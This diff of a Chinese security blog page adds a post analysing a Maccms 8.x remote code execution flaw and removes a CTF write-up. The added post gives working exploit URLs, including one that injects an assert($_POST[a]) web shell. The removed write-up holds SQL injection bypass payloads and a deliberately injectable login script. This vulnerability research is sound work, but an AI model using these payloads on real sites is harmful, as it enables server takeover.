@@ -155,6 +155,89 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-maccms8x" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/08/maccms8x/">Maccms8.x命令执行漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2019/05/08/maccms8x/" class="archive-article-date">
+  	<time datetime="2019-05-08T12:00:07.664Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>maccms8.x下载链接：<br><a href="https://share.weiyun.com/23802397ed25681ad45c112bf34cc6db" target="_blank" rel="noopener">https://share.weiyun.com/23802397ed25681ad45c112bf34cc6db</a></p>
+<p>两个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/maccms_php_v8/index.php?m=vod-search&amp;wd=&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/maccms/index.php?m=vod-search&amp;wd=</span><br><span class="line">&#123;if-A:assert($_POST[a])&#125;&#123;endif-A&#125;</span><br></pre></td></tr></table></figure></p>
+<p>测试效果如图(第一种payload):<br><img src="https://s2.ax1x.com/2019/05/09/EgnaIU.jpg" alt="image"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞发生在/inc/common/template.php 文件类ifex()方法中的eval处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">else&#123;</span><br><span class="line">    @eval(&quot;if($strif)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">	if ($ifFlag)&#123; $this-&gt;H=str_replace($iar[0][$m],$strThen,$this-&gt;H);&#125;</span><br><span class="line">    else &#123; $this-&gt;H=str_replace($iar[0][$m],&quot;&quot;,$this-&gt;H); &#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="正向分析"><a href="#正向分析" class="headerlink" title="正向分析"></a>正向分析</h3><p>首先在index.php开头require(“inc/conn.php”);,然后conn.php也包含了/inc/common/template.php文件，该文件会新建一个模版对象tpl，大致代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># /inc/common/template.php</span><br><span class="line">&lt;?php</span><br><span class="line">class AppTpl</span><br><span class="line">&#123;</span><br><span class="line">    var $markname,$markpar,$markdes,$markval,$markhtml;</span><br><span class="line">    function AppTpl()</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;P = array(&quot;vodtypeid&quot;=&gt;-1,&quot;vodtypepid&quot;=&gt;-1,&quot;vodtopicid&quot;=&gt;-1,&quot;arttypeid&quot;=&gt;-1,&quot;arttypepid&quot;=&gt;-1,&quot;arttopicid&quot;=&gt;-1,&quot;auto&quot;=&gt;false,&quot;pg&quot;=&gt;1);</span><br><span class="line">	&#125;</span><br><span class="line">...... 此处省略n行代码</span><br><span class="line">$tpl = new AppTpl();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>继续回到index.php &emsp;第15行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$m = be(&apos;get&apos;,&apos;m&apos;);</span><br></pre></td></tr></table></figure>
+<p>be函数的定义可以在 /inc/common/function.php 第257行找到<br>主要作用是对用户的请求数据进行消毒，防止sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /inc/common/function.php</span><br><span class="line">function be($mode,$key,$sp=&apos;,&apos;)</span><br><span class="line">&#123;</span><br><span class="line">	$magicq= get_magic_quotes_gpc();</span><br><span class="line">	switch($mode)</span><br><span class="line">	&#123;</span><br><span class="line">		case &apos;post&apos;:</span><br><span class="line">			$res=isset($_POST[$key]) ? $magicq?$_POST[$key]:@addslashes($_POST[$key]) : &apos;&apos;;</span><br><span class="line">			break;</span><br><span class="line">		case &apos;get&apos;:</span><br><span class="line">			$res=isset($_GET[$key]) ? $magicq?$_GET[$key]:@addslashes($_GET[$key]) : &apos;&apos;;</span><br><span class="line">			break;</span><br><span class="line">		case &apos;arr&apos;:</span><br><span class="line">			$arr =isset($_POST[$key]) ? $_POST[$key] : &apos;&apos;;</span><br><span class="line">			if($arr==&quot;&quot;)&#123;</span><br><span class="line">				$value=&quot;0&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				for($i=0;$i&lt;count($arr);$i++)&#123;</span><br><span class="line">					$res=implode($sp,$arr);</span><br><span class="line">				&#125; </span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			$res=isset($_REQUEST[$key]) ? $magicq ? $_REQUEST[$key] : @addslashes($_REQUEST[$key]) : &apos;&apos;;</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	return $res;</span><br><span class="line">&#125;	ini_set(&quot;magic_quotes_runtime&quot;, 0);</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ./index.php</span><br><span class="line">......</span><br><span class="line">require(&quot;inc/conn.php&quot;);</span><br><span class="line">require(MAC_ROOT.&apos;/inc/common/360_safe3.php&apos;);</span><br><span class="line">$m = be(&apos;get&apos;,&apos;m&apos;);</span><br><span class="line">if(strpos($m,&apos;.&apos;))&#123; $m = substr($m,0,strpos($m,&apos;.&apos;)); &#125;</span><br><span class="line">$par = explode(&apos;-&apos;,$m);</span><br><span class="line">$parlen = count($par);</span><br><span class="line">$ac = $par[0];</span><br><span class="line">......</span><br><span class="line">$acs = array(&apos;vod&apos;,&apos;art&apos;,&apos;map&apos;,&apos;user&apos;,&apos;gbook&apos;,&apos;comment&apos;,&apos;label&apos;);</span><br><span class="line">if(in_array($ac,$acs))&#123;</span><br><span class="line">    $tpl-&gt;P[&quot;module&quot;] = $ac;</span><br><span class="line">    include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>be函数之后进行explode分割-之后，也就是说?m=vod-search最后变成包含/inc/module/vod.php,且$method=search,这里分析一下vod.php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># /inc/module/vod.php</span><br><span class="line"></span><br><span class="line">elseif($method==&apos;search&apos;)</span><br><span class="line">&#123;</span><br><span class="line">	$tpl-&gt;P[&quot;siteaid&quot;] = 15;</span><br><span class="line">	$wd = be(&quot;all&quot;, &quot;wd&quot;);</span><br><span class="line">	if(!empty($wd))&#123; $tpl-&gt;P[&quot;wd&quot;] = $wd; &#125;</span><br><span class="line"></span><br><span class="line">    if ( $tpl-&gt;P[&apos;pg&apos;]==1 &amp;&amp; getTimeSpan(&quot;last_searchtime&quot;) &lt; $MAC[&apos;app&apos;][&apos;searchtime&apos;])&#123; </span><br><span class="line">		showMsg(&quot;请不要频繁操作，时间间隔为&quot;.$MAC[&apos;app&apos;][&apos;searchtime&apos;].&quot;秒&quot;,MAC_PATH);</span><br><span class="line">		exit;</span><br><span class="line">......</span><br><span class="line">    $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.&quot;/vod_search.html&quot;);</span><br><span class="line">    $tpl-&gt;mark();</span><br><span class="line">    $tpl-&gt;pageshow();</span><br><span class="line"></span><br><span class="line">    $colarr = array(&apos;&#123;page:des&#125;&apos;,&apos;&#123;page:key&#125;&apos;,&apos;&#123;page:now&#125;&apos;,&apos;&#123;page:order&#125;&apos;,&apos;&#123;page:by&#125;&apos;,&apos;&#123;page:wd&#125;&apos;,&apos;&#123;page:wdencode&#125;&apos;,&apos;&#123;page:pinyin&#125;&apos;,&apos;&#123;page:letter&#125;&apos;,&apos;&#123;page:year&#125;&apos;,&apos;&#123;page:starring&#125;&apos;,&apos;&#123;page:starringencode&#125;&apos;,&apos;&#123;page:directed&#125;&apos;,&apos;&#123;page:directedencode&#125;&apos;,&apos;&#123;page:area&#125;&apos;,&apos;&#123;page:areaencode&#125;&apos;,&apos;&#123;page:lang&#125;&apos;,&apos;&#123;page:langencode&#125;&apos;,&apos;&#123;page:typeid&#125;&apos;,&apos;&#123;page:typepid&#125;&apos;,&apos;&#123;page:classid&#125;&apos;);</span><br><span class="line">	$valarr = array($tpl-&gt;P[&quot;des&quot;],$tpl-&gt;P[&quot;key&quot;],$tpl-&gt;P[&quot;pg&quot;],$tpl-&gt;P[&quot;order&quot;],$tpl-&gt;P[&quot;by&quot;],$tpl-&gt;P[&quot;wd&quot;],urlencode($tpl-&gt;P[&quot;wd&quot;]),$tpl-&gt;P[&quot;pinyin&quot;],$tpl-&gt;P[&quot;letter&quot;],$tpl-&gt;P[&apos;year&apos;]==0?&apos;&apos;:$tpl-&gt;P[&apos;year&apos;],$tpl-&gt;P[&quot;starring&quot;],urlencode($tpl-&gt;P[&quot;starring&quot;]),$tpl-&gt;P[&quot;directed&quot;],urlencode($tpl-&gt;P[&quot;directed&quot;]),$tpl-&gt;P[&quot;area&quot;],urlencode($tpl-&gt;P[&quot;area&quot;]),$tpl-&gt;P[&quot;lang&quot;],urlencode($tpl-&gt;P[&quot;lang&quot;]),$tpl-&gt;P[&apos;typeid&apos;],$tpl-&gt;P[&apos;typepid&apos;] ,$tpl-&gt;P[&apos;classid&apos;]  );</span><br><span class="line">	</span><br><span class="line">	$tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);</span><br></pre></td></tr></table></figure>
+<p>$tpl-&gt;P[“wd”]等于’{if-A:phpinfo()}{endif-A}’;<br>且$tpl-&gt;H等于/template/paody/html/vod_search.html中的内容，<br>$tpl-&gt;H的内容也做了个替换，所有形式如：{xxx:xxx}会被替换成{if-A:phpinfo()}{endif-A} </p>
+<p>再看一下index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ./index.php</span><br><span class="line"></span><br><span class="line">    	include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;</span><br><span class="line">......</span><br><span class="line">    $tpl-&gt;ifex();</span><br><span class="line">    if(!empty($tpl-&gt;P[&apos;cp&apos;]))&#123; setPageCache($tpl-&gt;P[&apos;cp&apos;],$tpl-&gt;P[&apos;cn&apos;],$tpl-&gt;H); &#125;</span><br><span class="line">	$tpl-&gt;run();</span><br><span class="line">	echo $tpl-&gt;H;</span><br></pre></td></tr></table></figure>
+<p>最后还调用了ifex()方法，也就是我们开头提到的漏洞发生处，/inc/common/template.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /inc/common/template.php</span><br><span class="line">function ifex()</span><br><span class="line">&#123;</span><br><span class="line">    if (!strpos(&quot;,&quot;.$this-&gt;H,&quot;&#123;if-&quot;)) &#123; return; &#125;</span><br><span class="line">    $labelRule = buildregx(&apos;&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;&apos;,&quot;is&quot;);</span><br><span class="line">    preg_match_all($labelRule,$this-&gt;H,$iar);</span><br><span class="line">    $arlen=count($iar[2]);</span><br><span class="line">		</span><br><span class="line">    for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">    $strn = $iar[1][$m];</span><br><span class="line">    $strif= asp2phpif( $iar[2][$m] ) ;</span><br><span class="line">    $strThen= $iar[3][$m];</span><br><span class="line">    $elseifFlag=false;</span><br><span class="line">			</span><br><span class="line">    $labelRule2=&quot;&#123;elseif-&quot;.$strn.&quot;&quot;;</span><br><span class="line">    $labelRule3=&quot;&#123;else-&quot;.$strn.&quot;&#125;&quot;;</span><br><span class="line">			</span><br><span class="line">    if (strpos(&quot;,&quot;.$strThen,$labelRule2)&gt;0)&#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $ifFlag = false;</span><br><span class="line">        if (strpos(&quot;,&quot;.$strThen,$labelRule3)&gt;0)&#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            @eval(&quot;if($strif)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">            .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第863行中的$this-&gt;H 在 /inc/module/vod.php文件中已定义。</span><br><span class="line">第864行中的$labelRule 等于 /&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;/is，</span><br><span class="line">第865行中用preg_match_all()进行全局正则匹配，在$this-&gt;H中用这个pattern匹配，结果是一个二维数组，存储在$iar中。而payload中的phpinfo()将存储在$iar[2]中。这里测试一下:</span><br></pre></td></tr></table></figure>
+<p>本地搭建的代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$labelRule = &apos;/&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;/&apos;;</span><br><span class="line">preg_match_all($labelRule,&apos;&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;&apos;,$iar);</span><br><span class="line">print_r($iar);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($iar[0]);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($iar[1]).&apos;\n&apos;;</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r($iar[2]).&apos;\n&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [0] =&gt; &#123;if-A:phpinfo()&#125;&#123;endif-A&#125; ) [1] =&gt; Array ( [0] =&gt; A ) [2] =&gt; Array ( [0] =&gt; phpinfo() ) [3] =&gt; Array ( [0] =&gt; ) ) </span><br><span class="line">Array ( [0] =&gt; &#123;if-A:phpinfo()&#125;&#123;endif-A&#125; ) </span><br><span class="line">Array ( [0] =&gt; A ) </span><br><span class="line">Array ( [0] =&gt; phpinfo() )</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://mochazz.github.io/2018/03/06/代码审计之苹果cms8.x代码执行（复现）/" target="_blank" rel="noopener">代码审计之苹果cms8.x代码执行（复现）</a></p>
+<p><a href="http://www.cnblogs.com/test404/p/7397755.html" target="_blank" rel="noopener">Maccms8.x 命令执行漏洞分析</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/08/maccms8x/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-iscc 2019" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -993,99 +1076,9 @@
 
 
   
-    <article id="post-lun web" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/20/lun web/">CTF - 论剑场</a>
-    </h1>
-  
-
-        
-        <a href="/2019/03/20/lun web/" class="archive-article-date">
-  	<time datetime="2019-03-20T08:43:57.214Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="CTF-论剑场"><a href="#CTF-论剑场" class="headerlink" title="CTF - 论剑场"></a>CTF - 论剑场</h2><h3 id="闲来无事，做会题目-持续更新"><a href="#闲来无事，做会题目-持续更新" class="headerlink" title="闲来无事，做会题目(持续更新)"></a>闲来无事，做会题目(持续更新)</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$b = &apos;ssAEDsssss&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">    $c =trim(file_get_contents($b));</span><br><span class="line">    if($a==$c)&#123;</span><br><span class="line">        echo $myflag;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;继续努力，相信flag离你不远了&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-<p>考察变量覆盖漏洞extract() : 从数组中将变量导入到当前的符号表</p>
-<p>payload: a=&amp;b=</p>
-<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p><img src="https://s2.ax1x.com/2019/04/04/AgIgFU.jpg" alt="image"></p>
-<p>是个计算题，要求在三秒钟内算出来，明显写脚本跑</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://123.206.31.85:10002/&apos;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">res = r.get(url)</span><br><span class="line"># print response.text</span><br><span class="line">text = res.text</span><br><span class="line">cal = re.findall(&quot;(.*?)&lt;/p&gt;&quot;,text) #非贪婪算法</span><br><span class="line"># print str(cal)[3:-2]</span><br><span class="line">ans = eval(str(cal)[3:-2])</span><br><span class="line"># print ans</span><br><span class="line">data = &#123;&apos;result&apos;:ans&#125;</span><br><span class="line">res0 = r.post(url,data=data)</span><br><span class="line">print res0.text</span><br></pre></td></tr></table></figure>
-<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><ul>
-<li>考点 : php伪协议<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>考察万能密码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1 #</span><br></pre></td></tr></table></figure></p>
-<p>写了一下后台代码原理大致如下，亲测有效:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  $servername = &apos;127.0.0.1&apos;;</span><br><span class="line">  $username = &apos;root&apos;;</span><br><span class="line">  $password = &apos;root&apos;;</span><br><span class="line">  $dbname = &apos;code&apos;;</span><br><span class="line"></span><br><span class="line">  @$con = mysql_connect($servername,$username,$password);</span><br><span class="line"></span><br><span class="line">  if(!$con)&#123;</span><br><span class="line">    die(&apos;Failed to connect to Mysql&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">  mysql_select_db($dbname) or die(&apos;failed to connect to dbname:$dbname&apos;);</span><br><span class="line">  $username = $_POST[&apos;username&apos;];</span><br><span class="line">  $password = $_POST[&apos;password&apos;];</span><br><span class="line">  $sql = &quot;select * from user where username= &apos;$username&apos; and password = &apos;$password&apos;&quot;;</span><br><span class="line">  echo $sql;</span><br><span class="line">  $res = mysql_query($sql);</span><br><span class="line">  $row = mysql_fetch_array($res);</span><br><span class="line">  if($row)&#123;</span><br><span class="line">   	echo &quot;success&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">   	echo &quot;failed&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>sqlmap -u “地址” -v 3 –dbs</p>
-<p>-v 3 可以看到payload</p>
-<p>–tables –columns </p>
-<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message bugku then you can get the flag</span><br></pre></td></tr></table></figure>
-<p>curl -X PUT “地址” -d “bugku”</p>
-<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>robots.txt下发现shell.php<br><img src="https://s2.ax1x.com/2019/04/03/Ac29MT.jpg" alt="image"><br>md5截断验证<br>这里采用短时间生成大量MD5，牺牲空间来换取时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">sum = []</span><br><span class="line">j = 0</span><br><span class="line">f = open(&quot;gen_md5.txt&quot;, &quot;a&quot;)</span><br><span class="line">for i in xrange(10000000):</span><br><span class="line">    tmp = (hashlib.md5(str(i)).hexdigest(),i)</span><br><span class="line">    sum.append(tmp)</span><br><span class="line">    # print sum</span><br><span class="line">    j = j+1</span><br><span class="line">    if(j==10000000):</span><br><span class="line">        # print sum</span><br><span class="line">        for i in sum:</span><br><span class="line">            f.write(&quot;&#123;0&#125;&#123;1&#125;&quot;.format(i,&quot;\n&quot;))</span><br><span class="line">        j=0</span><br><span class="line">        sum = []</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
-<p>然后再执行匹配命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat gen_md5.txt|grep \(\&apos;str  //str是题目</span><br></pre></td></tr></table></figure></p>
-<h3 id="web17-流量分析"><a href="#web17-流量分析" class="headerlink" title="web17 流量分析"></a>web17 流量分析</h3><p>用wireshark追踪TCP流即可看见flag</p>
-<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>是个sql绕过注入</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/Ag4WAU.jpg" alt="image"></p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata --+</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database() aandnd table_name = &apos;flag&apos; --+</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,flag,3 from flag --+</span><br></pre></td></tr></table></figure>
-<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你的动态密文是：4803baa775dc5841bf99fae420c1a7688</span><br><span class="line">GET提交对应的密文可以得到flag(form_input_name=&apos;key&apos;)</span><br><span class="line">输出格式：&apos;flag&#123;....&#125;&apos;</span><br></pre></td></tr></table></figure></p>
